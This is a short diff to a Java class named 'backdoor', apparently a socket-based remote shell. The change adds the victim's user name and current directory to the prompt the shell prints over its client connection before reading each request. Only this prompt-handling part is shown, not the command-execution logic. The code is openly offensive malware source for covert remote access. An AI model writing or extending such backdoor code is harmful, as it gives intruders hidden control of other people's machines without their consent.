@@ -19,9 +19,12 @@ public class backdoor {
 
 				OutputStreamWriter osr = new OutputStreamWriter(clientSocket.getOutputStream());
 				PrintWriter out = new PrintWriter(osr, true);
+				
+				String dir = System.getProperty("user.dir");
+				String name = System.getProperty("user.name");
 
 				loop: while(true){
-					out.print("> ");
+					out.print("[" + name + " " + dir + "]> ");
 					out.flush();
 					String request = in.readLine();
 					
